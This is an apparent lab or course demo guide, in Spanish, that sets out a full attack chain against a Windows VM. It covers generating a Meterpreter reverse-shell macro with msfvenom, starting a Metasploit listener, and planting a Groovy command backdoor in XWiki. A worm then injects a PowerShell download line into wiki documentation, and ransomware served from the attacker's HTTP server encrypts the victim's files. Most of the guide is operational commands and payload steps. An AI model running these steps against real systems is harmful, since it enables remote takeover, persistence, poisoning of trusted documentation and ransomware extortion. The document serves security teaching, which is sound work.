# 🛡️ Malware Project - Attack Demo Guide

Este documento detalla los pasos exactos para reproducir la cadena de ataque completa: **Phishing (Word) → Meterpreter RCE → Persistencia XWiki → Worm Propagation → Ransomware**.

-----

## 🏗️ 1. Preparación del Entorno (PRE-DEMO)

Estos pasos deben realizarse **antes** de empezar la presentación para asegurar que todo funcione a la primera.

### 🖥️ VM Windows (Víctima)

1.  **Desactivar Protecciones:**
      * [ ] Desactivar **Firewall de Windows**.
      * [ ] Desactivar **Windows Security** (Virus & threat protection → Manage settings → Real-time protection: OFF).
2.  **Configurar Word:**
      * [ ] Ir a *File \> Options \> Trust Center \> Trust Center Settings \> Macro Settings*.
      * [ ] Seleccionar **"Enable all macros"**.
3.  **Iniciar XWiki:**
      * [ ] Ejecutar el script de inicio (ej. `start_xwiki.bat`) y esperar a que Jetty arranque en el puerto 8080.
4.  **Crear Páginas "Cebo" en XWiki:**
      * Loguearse como Admin (`admin`/`admin`).
      * Crear espacio/página `Dev`:
          * **GitLabCIStandardTemplate**: Pegar contenido limpio inicial (sin malware).
          * **SetupEntornoLocal**: Pegar contenido de relleno.
      * *Nota:* Dejar el navegador abierto en la página `GitLabCIStandardTemplate`.

### 🐧 VM Kali Linux (Atacante)

1.  **Configurar IPs:** Asegurar que `TARGET_IP` (Windows) y `ATTACKER_IP` (Kali) son correctas en todos los scripts (`worm.py`, `exploit.py`).
2.  **Generar Payload VBA (Macro):**
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP-KALI> LPORT=4444 -f vba
    ```
    
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.10.3 LPORT=4444 -f vba
    ```
    *Copiar el output y pegarlo en el script del exploit de Python (`CVE-2025-47957.py`) en la sección de la macro.*

-----

## 🚀 2. Ejecución de la Demo

### FASE 1: Acceso Inicial (Phishing & Meterpreter)

**En Kali Linux:**

1.  **Iniciar Listener (Metasploit):**
    ```bash
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP-KALI>; set LPORT 4444; run"
    ```
    ```bash
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 172.20.10.3; set LPORT 4444; run"
    ```
2.  **Generar Documento Malicioso:**
      * Ejecutar el script `CVE-2025-47957.py`.
      * Enviar/Copiar el `.docm` generado a la VM Windows.

**En Windows:**
3\.  **Detonar Payload:**
\* Abrir el documento Word.
\* Hacer clic en **"Enable Content"**.

**En Kali Linux:**
4\.  **Confirmar Acceso:**
\* Verificar que se ha abierto la sesión de Meterpreter (`meterpreter >`).
\* *(Opcional)* Habilitar acceso al XWiki desde el navegador de Kali:
` bash portfwd add -l 8081 -p 8080 -r 127.0.0.1  `

-----

### FASE 2: Persistencia (Backdoor en XWiki)

*Narrativa:* "Con acceso al sistema (System/Meterpreter), obtenemos credenciales de administrador (ej. fichero de config o default credentials) para crear una persistencia web."

**Desde el Navegador (Kali o Windows):**

1.  **Acceder a XWiki:** `http://<IP-WINDOWS>:8080/xwiki` (o `localhost:8081` si hiciste portfwd).
2.  **Login:** Usuario `admin`, Password `admin`.
3.  **Crear Backdoor:**
      * Crear nueva página llamada `SystemUpdate`.
      * Ir a modo edición **"Source"**.
      * Pegar el código de la Backdoor (Groovy script).
      * Guardar.
4.  **Verificar:**
      * Visitar: `.../bin/view/Main/SystemUpdate?cmd=whoami`.
      * Confirmar que devuelve `nt authority\system` o similar.
      * SystemUpdate?cmd=cmd%20/c%20dir%20%22C:%5CUsers%5C*%22%20/s%20/b%20%7C%20findstr%20/i%20%22legal-files%22
      * SystemUpdate?cmd=ipconfig

-----

### FASE 3: Propagación (The Worm)

*Narrativa:* "Usamos la backdoor para automatizar la inyección de código malicioso en la documentación de desarrollo."

**En Kali Linux:**

1.  **Servir el Ransomware:**
      * Abrir terminal en la carpeta donde está `shadowvault.ps1`.
      * Levantar servidor:
        ```bash
        python3 -m http.server 8000
        ```
2.  **Lanzar el Gusano:**
      * Ejecutar el script final del worm (ej. `real_worm_fixed.py`).
      * Esperar el mensaje: `[✔] SUCCESS: WORM & DROPPER DEPLOYED`.

**En Windows (Visualización):**
3\.  **Verificar Infección:**
\* Ir a la página `GitLabCIStandardTemplate`.
\* Refrescar (F5).
\* Mostrar la nueva línea de código inyectada (`powershell -ExecutionPolicy Bypass...`).

-----

### FASE 4: Impacto (Ransomware)

*Narrativa:* "El desarrollador confía en la documentación oficial, copia el código para su pipeline y detona la carga final."

**En Windows:**

1.  **Simular Desarrollador:**
      * Copiar el bloque de código infectado de la Wiki.
      * Abrir PowerShell (o CMD).
      * Pegar y ejecutar.
2.  **Resultado:**
      * Ver descarga en el servidor Python de Kali (`GET /shadowvault.ps1 200 OK`).
      * Ver archivos encriptados (`.locked`) y nota de rescate en Windows.

-----

## 📝 Notas Técnicas / Configuración

  * **IP Kali:** `192.168.2.171` or `172.20.10.3`
  * **IP Windows:** `192.168.2.178` or `172.20.10.5`
  * **Puerto Webserver (Malware):** 8000
  * **Puerto XWiki:** 8080
  * **Credenciales XWiki:** admin / admin

> **⚠️ IMPORTANTE:** Si el exploit de Word falla, verificar que las IPs en el payload de `msfvenom` son las actuales, ya que cambian al reiniciar las VMs.
